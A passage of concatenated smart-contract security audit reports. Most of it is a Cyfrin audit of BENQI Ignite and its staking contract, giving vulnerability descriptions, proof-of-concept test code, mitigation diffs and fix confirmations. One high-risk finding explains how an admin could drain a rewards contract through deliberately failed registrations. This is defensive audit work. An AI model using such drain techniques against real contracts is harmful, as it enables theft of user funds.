    uint256 blobSubmissionLength = _blobSubmissions.length;

    if (blobSubmissionLength == 0) {
      revert BlobSubmissionDataIsMissing();
    }

    if (blobhash(blobSubmissionLength) != EMPTY_HASH) {
      revert BlobSubmissionDataEmpty(blobSubmissionLength);
    }

    if (blobShnarfExists[_parentShnarf] == 0) {
      revert ParentBlobNotSubmitted(_parentShnarf);
    }

    if (blobShnarfExists[_finalBlobShnarf] != 0) {
      revert DataAlreadySubmitted(_finalBlobShnarf);
    }

    // variable declarations and processing follow
```

The same applies in `submitDataAsCalldata`:
```solidity
  function submitDataAsCalldata(
    CompressedCalldataSubmission calldata _submission,
    bytes32 _parentShnarf,
    bytes32 _expectedShnarf
  ) external whenTypeAndGeneralNotPaused(PauseType.CALLDATA_SUBMISSION) onlyRole(OPERATOR_ROLE) {
    if (_submission.compressedData.length == 0) {
      revert EmptySubmissionData();
    }

    if (blobShnarfExists[_expectedShnarf] != 0) {
      revert DataAlreadySubmitted(_expectedShnarf);
    }

    // ...
```

**Linea:** Fixed in [PR247](https://github.com/Consensys/linea-monorepo/pull/247) commit [968b257](https://github.com/Consensys/linea-monorepo/pull/247/commits/968b25795d1323d83360cbc3be3480a861b12aac).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-11-28-cyfrin-linea-v2.0.md ------


------ FILE START car/reports_md/2024-12-11-cyfrin-benqi-ignite-v2.0.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Immeas](https://twitter.com/0ximmeas)

**Assisting Auditors**



---

# Findings
## High Risk


### Zeeve admin could drain `ValidatorRewarder` by abusing off-chain BLS validation due to `QI` rewards being granted to failed registrations

**Description:** [`Ignite::releaseLockedTokens`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L580-L583) takes the [`failed`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L578) boolean as a parameter, intended to indicate that registration of the node has failed and allow the user's stake to be recovered by a call to [`Ignite::redeemAfterExpiry`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L407). Registrations made by [`Ignite::registerWithAvaxFee`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L251) and [`Ignite::registerWithErc20Fee`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L281) are handled within the [first conditional branch](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L416-L419); however, those made via [`Ignite::registerWithStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L202) and [`Ignite::registerWithPrevalidatedQiStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L361) are not considered until the [final conditional branch](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L459-L471) shown below:

```solidity
} else {
    avaxRedemptionAmount = avaxDepositAmount + registration.rewardAmount;
    qiRedemptionAmount = qiDepositAmount;

    if (qiRewardEligibilityByNodeId[nodeId]) {
        qiRedemptionAmount += validatorRewarder.claimRewards(
            registration.validationDuration,
            registration.tokenDeposits.tokenAmount
        );
    }

    minimumContractBalance -= avaxRedemptionAmount;
}
```

This is fine for registrations made with `AVAX` stake, since the reward amount is never updated from `0`; however, for those made with pre-validated QI stake, the call to `ValidatorRewarder::claimRewards` is executed regardless, returning the original stake in QI plus QI rewards for the full duration.

Furthermore, this behavior could be abused by the Zeeve admin to drain `QI` tokens from the `ValidatorRewarder` contract. Assuming interactions are made directly with the deployed contracts to bypass frontend checks, a faulty BLS proof can be provided to `StakingContract::registerNode`  this BLS proof is validated by an off-chain service when the `NewRegistration` event is detected, and `Ignite::releaseLockedTokens` will be called if it is invalid.

While Zeeve is somewhat of a trusted entity, they could very easily and relatively inconspicuously stake with burner user addresses, forcing the failure of BLS proof validation to drain the `ValidatorRewarder` contract due to the behavior of this off-chain logic in conjunction with the incorrect handling of `QI` rewards for failed registrations.

**Impact:** `QI` rewards will be paid to users of failed registrations made via `Ignite::registerWithPrevalidatedQiStake`. If abused by the Zeeve admin, then entire `ValidatorRewarder` contract balance could be drained.

**Proof of Concept:** The following test can be added to `Ignite.test.js` under `describe("Superpools")`:

```javascript
it("earns qi rewards for failed registrations", async function () {
  await validatorRewarder.setTargetApr(1000);
  await ignite.setValidatorRewarder(validatorRewarder.address);
  await grantRole("ROLE_RELEASE_LOCKED_TOKENS", admin.address);

  // AVAX $20, QI $0.01
  const qiStake = hre.ethers.utils.parseEther("200").mul(2_000);
  const qiFee = hre.ethers.utils.parseEther("1").mul(2_000);

  // approve Ignite to spend pre-validated QI (bypassing StakingContract)
  await qi.approve(ignite.address, qiStake.add(qiFee));
  await ignite.registerWithPrevalidatedQiStake(
    admin.address,
    "NodeID-Superpools1",
    "0x" + blsPoP.toString("hex"),
    86400 * 28,
    qiStake.add(qiFee),
  );

  // registration of node fails
  await ignite.releaseLockedTokens("NodeID-Superpools1", true);

  const balanceBefore = await qi.balanceOf(admin.address);
  await ignite.connect(admin).redeemAfterExpiry("NodeID-Superpools1");

  const balanceAfter = await qi.balanceOf(admin.address);

  // stake + rewards are returned to the user
  expect(Number(balanceAfter.sub(balanceBefore))).to.be.greaterThan(Number(qiStake));
});
```

**Recommended Mitigation:** Avoid paying QI rewards to failed registrations by resetting the `qiRewardEligibilityByNodeId` state in `Ignite::releaseLockedTokens`:

```diff
    } else {
        minimumContractBalance += msg.value;
        totalSubsidisedAmount -= 2000e18 - msg.value;
+       qiRewardEligibilityByNodeId[nodeId] = false;
    }
```

**BENQI:** Fixed in commit [0255923](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/0255923e9c0d23c3fde71a6bdf1237ec4677c02d).

**Cyfrin:** Verified, `QI` rewards are no longer granted to failed registrations.

\clearpage
## Medium Risk


### Redemption of slashed registrations could result in DoS due to incorrect state update

**Description:** Due to the logic surrounding Pay As You Go (PAYG) registrations, potential refunds associated with failed validators, and post-expiry redemptions of stake, a minimum balance of `AVAX` is required to remain within the `Ignite` contract. The [`IgniteStorage::minimumContractBalance`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/IgniteStorage.sol#L97-L98) state variable is responsible for keeping track of this balance and ensuring that [`Ignite::withdraw`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L556-L572) transfers the appropriate amount of `AVAX` to start validation.

When the validation period for a given registration has expired, [`Ignite::releaseLockedTokens`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L574-L707) is called by the privileged `ROLE_RELEASE_LOCKED_TOKENS` actor along with the redeemable tokens. If the registration is slashed, `minimumContractBalance` is [updated](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L695-L697) to include `msg.value` less the slashed amount. Finally, when [`Ignite::redeemAfterExpiry`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L402-L481) is called by the original registerer to redeem the tokens, the `minimumContractBalance` state is again updated to discount this withdrawn amount.

However, this [state update](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L458) is incorrect as it should decrement the `avaxRedemptionAmount` rather than the `avaxDepositAmount` (which includes the already-accounted-for slashed amount). Therefore, `minimumContractBalance` will be smaller than intended, resulting in redemptions reverting due to underflow of the decrement or if a call to `Ignite::withdraw` leaves the contract with insufficient balance to fulfill its obligations.

**Impact:** Redemptions could revert if the current redemption is slashed and the state update underflows or if an earlier redemption is slashed and more `AVAX` is withdrawn than intended.

**Proof of Concept:** The following test can be added under `describe("users can withdraw tokens after the registration becomes withdrawable")` in `ignite.test.js`:

```javascript
it("with slashing using a slash percentage", async function () {
  // Add AVAX slashing percentage to trigger the bug (50% so the numbers are easy)
  await ignite.setAvaxSlashPercentage("5000");

  // Register NodeID-1 for two weeks with 1000 AVAX and 200k QI
  await ignite.registerWithStake("NodeID-1", blsPoP, 86400 * 14, {
    value: hre.ethers.utils.parseEther("1000"),
  });

  // Release the registration with `msg.value` equal to AVAX deposit amount to trigger slashing
  await ignite.releaseLockedTokens("NodeID-1", false, {
    value: hre.ethers.utils.parseEther("1000"),
  });

  // The slashed amount is decremented from the minumum contract balance
  expect(await ignite.minimumContractBalance()).to.equal(hre.ethers.utils.parseEther("500"));

  // Reverts on underflow since it tries to subtract 1000 (avaxDepositAmount) from 500 (minimumContractBalance)
  await expect(ignite.redeemAfterExpiry("NodeID-1")).to.be.reverted;
});
```

Note that this is not an issue for the existing deployed version of this contract as the AVAX slash percentage is zero.

**Recommended Mitigation:** Decrement `minimumContractBalance` by `avaxRedemptionAmount` instead of `avaxDepositAmount`:

```diff
if (registration.slashed) {
    avaxRedemptionAmount = avaxDepositAmount - avaxDepositAmount * registration.avaxSlashPercentage / 10_000;
    qiRedemptionAmount = qiDepositAmount - qiDepositAmount * registration.qiSlashPercentage / 10_000;

-   minimumContractBalance -= avaxDepositAmount;
+   minimumContractBalance -= avaxRedemptionAmount;
} else {
```

**BENQI:** Fixed in commit [fb686b8](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/fb686b85ca88b0d90404f46f959f505fc1674fc0).

**Cyfrin:** Verified. The correct state update is now applied.


### The default admin role controls all other roles within `StakingContract`

**Description:** Within `StakingContract`, there is intended separation between the Zeeve and BENQI admin/super-admin roles as implemented in the [`grantAdminRole()`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L986), [`revokeAdminRole()`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L1017), and [`updateAdminRole()`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L1048) functions. The intention is for admin roles to be managed by the corresponding super-admin; however, `AccessControlUpgradeable::_setRoleAdmin` is never invoked for any of the roles and the current implementation fails to consider the default admin role that is [granted to the BENQI super-admin](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L169) for pausing purposes when the contract is initialized. As a result, the BENQI super-admin can be used to manage all other roles by invoking `AccessControlUpgradeable::grantRole` and `AccessControlUpgradeable::revokeRole` directly. This behavior is used in `Ignite` and `ValidatorRewarder` to grant the appropriate roles; however, it is not desirable in `StakingContract`.

**Impact:** The default admin role granted to the BENQI super-admin can be used to control all other roles.

**Proof of Concept:** The following test can be added to `stakingContract.test.js` under `describe("updateAdminRole")`:

```javascript
it("allows BENQI_SUPER_ADMIN to update ZEEVE_SUPER_ADMIN", async function () {
    const zeeveSuperAdminRole = await stakingContract.ZEEVE_SUPER_ADMIN_ROLE();

    // BENQI_SUPER_ADMIN can use OpenZepplin's grantRole to alter ZEEVE_SUPER_ADMIN_ROLE
    await stakingContract.connect(benqiSuperAdmin).grantRole(zeeveSuperAdminRole, otherUser.address);
    await stakingContract.connect(benqiSuperAdmin).revokeRole(zeeveSuperAdminRole, zeeveSuperAdmin.address);

    expect(await stakingContract.hasRole(zeeveSuperAdminRole, otherUser.address)).to.be.true;
    expect(await stakingContract.hasRole(zeeveSuperAdminRole, zeeveSuperAdmin.address)).to.be.false;
});
```

An equivalent Foundry test can be run with the provided fixtures:

```solidity
function test_defaultAdminControlsAllRolesPoC() public {
    assertEq(stakingContract.getRoleAdmin(stakingContract.DEFAULT_ADMIN_ROLE()), stakingContract.DEFAULT_ADMIN_ROLE());
    assertEq(stakingContract.getRoleAdmin(stakingContract.BENQI_SUPER_ADMIN_ROLE()), stakingContract.DEFAULT_ADMIN_ROLE());
    assertEq(stakingContract.getRoleAdmin(stakingContract.BENQI_ADMIN_ROLE()), stakingContract.DEFAULT_ADMIN_ROLE());
    assertEq(stakingContract.getRoleAdmin(stakingContract.ZEEVE_SUPER_ADMIN_ROLE()), stakingContract.DEFAULT_ADMIN_ROLE());
    assertEq(stakingContract.getRoleAdmin(stakingContract.ZEEVE_ADMIN_ROLE()), stakingContract.DEFAULT_ADMIN_ROLE());

    address EXTERNAL_ADDRESS = makeAddr("EXTERNAL_ADDRESS");
    vm.startPrank(BENQI_SUPER_ADMIN);
    stakingContract.grantRole(stakingContract.ZEEVE_SUPER_ADMIN_ROLE(), EXTERNAL_ADDRESS);
    vm.stopPrank();
    assertTrue(stakingContract.hasRole(stakingContract.ZEEVE_SUPER_ADMIN_ROLE(), EXTERNAL_ADDRESS));
}
```

**Recommended Mitigation:** Consider either:
1. Setting the appropriate role admins during initialization.
2. Removing the default admin role and creating a separate pauser role.
3. Overriding the OpenZeppelin functions to prevent them from being called directly.

**BENQI:** Fixed in commit [491a278](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/491a278be80605bbf23cef71bed5227ea11d201e).

**Cyfrin:** Verified. The OpenZeppelin function have been overridden.


### Inconsistent transfers of native tokens could result in unexpected loss of funds

**Description:** Multiple protocol functions across both `Ignite` and `StakingContract` transfer native `AVAX` to the user and/or protocol fee/slashed token recipients.

Throughout `Ignite` [[1](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L215), [2](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L427), [3](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L477), [4](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L563), [5](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L639), [6](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L699)], the low-level `.call()` pattern is used; however, this same behavior is not followed in `StakingContract`  the `.transfer()` function is used on lines [433](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L433) and [484](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L484), and on line [728](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L728-L733) `_transferETHAndWrapIfFailWithGasLimit()` is used, all with a `2300` gas stipend.

While these other functions may have been used to mitigate against potential re-entrancy attacks, native token transfers using low-level calls are preferred over `.transfer()` to mitigate against changes in gas costs, as described [here](https://consensys.io/diligence/blog/2019/09/stop-using-soliditys-transfer-now/). The instances on lines 433 and 484 are particularly problematic as they have no `WAVAX` fallback and could result in an unexpected loss of funds as described [here](https://solodit.xyz/issues/m-01-swapsol-implements-potentially-dangerous-transfer-code4rena-tally-tally-contest-git) and in the linked examples.

**Impact:** There could be an unexpected loss of funds if the recipient of a transfer (applicable to both users and the Zeeve wallet) is a smart contract that fails to implement a payable fallback function, or the fallback function uses more than 2300 gas units. This could happen, for example, if the recipient is a smart account whose fallback function logic causes the execution to use more than 2300 gas.

**Recommended Mitigation:** Consider modifying the instances of native token transfers in `StakingContract` to use low-level calls, making the necessary adjustments to protect against re-entrancy.

**BENQI:** Fixed in commit [ee98629](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/ee98629daa2b815de4102d9af86f27fb36af67cf).

**Cyfrin:** Verified. The `_transferETHAndWrapIfFailWithGasLimit()` function is now used throughout `StakingContract`.


### Redemption of failed registration fees and pre-validated QI is not guaranteed to be possible

**Description:** [`Ignite::registerWithStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L202) performs a [low-level call](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L215-L216) as part of its validation to ensure the beneficiary,in this case `msg.sender`, can receive `AVAX`:

```solidity
// Verify that the sender can receive AVAX
(bool success, ) = msg.sender.call("");
require(success);
```

However, this is missing from [`Ignite::registerWithAvaxFee`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L251), meaning that failed registration fees are not guaranteed to be redeemable if the sender is a contract that cannot receive `AVAX`.

Similarly, [`Ignite::registerWithPrevalidatedQiStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L361) performs no such validation on the beneficiary. While this may not seem to be problematic, since the stake requirement is provided in `QI`, there is a [low-level call](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L477-L478) in [`Ignite::redeemAfterExpiry`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L407) that will attempt a zero-value transfer for pre-validated `QI` stakes:

```solidity
(bool success, ) = msg.sender.call{ value: avaxRedemptionAmount}("");
require(success);
```

If the specified beneficiary is a contract without a payable fallback/receive function then this call will fail. Furthermore, if this beneficiary contract is immutable, the `QI` stake will be locked in the `Ignite` contract unless it is upgraded.

**Impact:** Failed `AVAX` registration fees and prevalidated `QI` stakes will remain locked in the `Ignite` contract.

**Proof of Concept:** The following standalone Forge test demonstrates the behavior described above:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract A {}

contract TestPayable is Test {
    address eoa;
    A a;

    function setUp() public {
        eoa = makeAddr("EOA");
        a = new A();
    }

    function test_payable() external {
        // Attempt to call an EOA with zero-value transfer
        (bool success, ) = eoa.call{value: 0 ether}("");

        // Assert that the call succeeded
        assertEq(success, true);

        // Attempt to call a contract that does not have a payable fallback/receive function with zero-value transfer
        (success, ) = address(a).call{value: 0 ether}("");

        // Assert that the call failed
        assertEq(success, false);
    }
}
```

**Recommended Mitigation:** Consider adding validation to `Ignite::registerWithAvaxFee` and `Ignite::registerWithPrevalidatedQiStake`. If performing a low-level call within `Ignite::registerWithPrevalidatedQiStake`, also consider adding the `nonReentrant` modifier.

**BENQI:** Fixed in commit [7d45908](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/7d45908fce2eefec90e5a67963311b250ae8c748). There will no longer be a native token transfer for pre-validated QI stake registrations since this non-zero check is added before the call in commit [f671224](https://github.com/Benqi-fi/ignite-contracts/blob/f67122426c5dff6023da1ec9602c1959703db28e/src/Ignite.sol#L478-L481).

**Cyfrin:** Verified. The low-level call has been added to `Ignite::registerWithAvaxFee` and pre-validated QI stake registrations no longer have a zero-value call on redemption.


### Ignite fee is not returned for pre-validated `QI` stakes in the event of registration failure

**Description:** The `1 AVAX` [Ignite fee](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L387) applied to pre-validated `QI` stakes is [paid to the fee recipient](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L388) at the time of registration. If this registration fails (e.g. due to off-chain BLS proof validation), the registration will be [marked as withdrawable](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L620) once `Ignite::releaseLockedTokens` is called; however, since the fee has already been paid and [deducted from the user's stake amount](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L397), it will not be returned with the refunded `QI` stake. This behavior differs from the other registration methods, which all refund the usually non-refundable fee in the event of registration failure.

**Impact:** Users who register with a hosted Zeeve validator will not be refunded the Ignite fee if registration fails.

**Recommended Mitigation:** Refund the Ignite fee if registration fails for pre-validated `QI` stakes.

**BENQI:** Fixed in commit [f671224](https://github.com/Benqi-fi/ignite-contracts/commit/f67122426c5dff6023da1ec9602c1959703db28e).

**Cyfrin:** Verified. The fee is now taken from successful registrations during the call to `Ignite::releaseLockedTokens`.

\clearpage
## Low Risk


### `StakingContract` refunds are affected by global parameter updates

**Description:** When [`StakingContract::refundStakedAmount`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L691-741) is called by the BENQI admin, the following validation is performed using the globally-defined `refundPeriod`:

```solidity
require(
    block.timestamp > record.timestamp + refundPeriod,
    "Refund period not reached"
);
```

The [`StakingContract::StakeRecord`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L69-77) struct does not have a corresponding member and so does not store the value of `refundPeriod` at the time of staking; however, if [`StakingContract::setRefundPeriod`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L675-689) is called with an updated period then that of an existing record could be shorter/longer than expected.

**Impact:** The refund period for existing records could be affected by global parameter updates.

**Recommended Mitigation:** Consider adding an additional member to the `StakeRecord` struct to store the value of `refundPeriod` at the time of staking.

**BENQI:** Acknowledged, working as expected.

**Cyfrin:** Acknowledged.


### Insufficient validation of Chainlink price feeds

**Description:** Validation of the `price` and `updatedAt` values returned by Chainlink `AggregatorV3Interface::latestRoundData` is performed within the following functions:
- [`StakingContract::_validateAndSetPriceFeed`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L923-925)
- [`StakingContract::_getPriceInUSD`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L937-943)
- [`Ignite::_initialisePriceFeeds`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L187-L189)
- [`Ignite::registerWithStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L218-L223)
- [`Ignite::registerWithErc20Fee`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L291-L296)
- [`Ignite::registerWithPrevalidatedQiStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L373-L378)
- [`Ignite::addPaymentToken`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L806-L808)
- [`Ignite::configurePriceFeed`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L856-L858)

However, there is additional validation shown below that is recommended but currently not present:

```solidity
(uint80 roundId, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
if(roundId == 0) revert InvalidRoundId();
if(updatedAt == 0 || updatedAt > block.timestamp) revert InvalidUpdate();
```

**Impact:** The impact is limited because the most important price and staleness validation are already present.

**Recommended Mitigation:** Consider including this additional validation and consolidating it into a single internal function.

**BENQI:** Acknowledged, current validation is deemed sufficient.

**Cyfrin:** Acknowledged.


### Incorrect operator when validating subsidisation cap

**Description:** When a new registration is created, `Ignite::_registerWithChecks` [validates](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L925-L928) that the subsidisation amount for the registration does not cause the maximum to be exceeded when added to the existing total subsidised amount:

```solidity
require(
    totalSubsidisedAmount + subsidisationAmount < maximumSubsidisationAmount,
    "Subsidisation cap exceeded"
);
```

However, the incorrect operator is used when performing this comparison.

**Impact:** Registrations that cause the maximum subsidization amount to be met exactly will revert.

**Recommended Mitigation:**
```diff
    require(
-       totalSubsidisedAmount + subsidisationAmount < maximumSubsidisationAmount,
+       totalSubsidisedAmount + subsidisationAmount <= maximumSubsidisationAmount,
        "Subsidisation cap exceeded"
    );
```

**BENQI:** Fixed in commit [37446f6](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/37446f681d9f09000bb22682a9a153a0c7b23548).

**Cyfrin:** Verified. The operator has been changed.


### `StakingContract::slippage` can be outside of `minSlippage` or `maxSlippage`

**Description:** When the BENQI admin sets the `slippage` state by calling [`StakingContract::setSlippage`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L313-328), it is validated that this new value is between the `minSlippage` and `maxSlippage` thresholds:

```solidity
require(
    _slippage >= minSlippage && _slippage <= maxSlippage,
    "Slippage must be between min and max"
);
```

The admin can also change both `minSlippage` and `maxSlippage` via [`StakingContract::setMinSlippage`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L330-345) and [`StakingContract::setMaxSlippage`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L347-360); however, neither of these functions has any validation that the `slippage` state variable remains within the boundaries.

**Impact:** Incorrect usage of either `StakingContract::setMaxSlippage` or `StakingContract::setMinSlippage` can result in the `slippage` state variable being outside the range.

**Proof of Concept:** The following test can be added to `stakingContract.test.js` under `describe("setSlippage")`:

```javascript
it("can have slippage outside of max and min", async function () {
    // slippage is set to 4
    await stakingContract.connect(benqiAdmin).setSlippage(4);
    // max slippage is updated below it
    await stakingContract.connect(benqiAdmin).setMaxSlippage(3);

    const slippage = await stakingContract.slippage();
    const maxSlippage = await stakingContract.maxSlippage();
    expect(slippage).to.be.greaterThan(maxSlippage);
});
```

**Recommended Mitigation:** Consider validating that the `slippage` state variable is within the boundaries set using `setMin/MaxSlippage()`.

**BENQI:** Fixed in commits [96e1b96](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/96e1b9610970259cffdf44fd7cf1af527016b0ce) and [dbb13c5](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/dbb13c55047e4ce52e39f833196fc78ed5c0cf8a).

**Cyfrin:** Verified.


### Lack of user-defined slippage and deadline parameters in `StakingContract::swapForQI` may result in unfavorable `QI` token swaps

**Description:** When a user interacts with `StakingContract` to provision a hosted node, they can choose between two methods:[`StakingContract::stakeWithAVAX`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L457-L511) or [`StakingContract::stakeWithERC20`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L513-L577). If the staked token is not `QI`, `StakingContract::swapForQI` is invoked to swap the staked token for `QI` via Trader Joe. Once created, the validator node is then [registered](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L441-448) with [`Ignite`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L353-L400), using `QI`, via `StakingContract::registerNode`.

Within the swap to `QI`, `amountOutMin` is [calculated](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L844) using Chainlink price data and a slippage parameter defined by the protocol:

```solidity
// Get the best price quote
uint256 slippageFactor = 100 - slippage; // Convert slippage percentage to factor
uint256 amountOutMin = (expectedQiAmount * slippageFactor) / 100; // Apply slippage
```

If the actual amount of `QI` received is below this `amountOutMin`, the transaction will [revert](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L897-L900); however, users are restricted by the protocol-defined slippage, which may not reflect their preferences if they desire a smaller slippage tolerance to ensure they receive a more favorable swap execution.

Additionally, the swap [deadline](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L863) specified as `block.timestamp` in `StakingContract::swapForQI` provides no protection as deadline validation will pass whenever the transaction is included in a block:

```solidity
uint256 deadline = block.timestamp;
```

This could expose users to unfavorable price fluctuations and again offers no option for users to provide their own deadline parameter.

**Impact:** Users may receive fewer `QI` tokens than expected due to the fixed slippage tolerance set by the protocol, potentially resulting in unfavorable swap outcomes.

**Recommended Mitigation:** Consider allowing users to provide a `minAmountOut` slippage parameter and a `deadline` parameter for the swap operation. The user-specified `minAmountOut` should override the protocol's slippage-adjusted amount if larger.

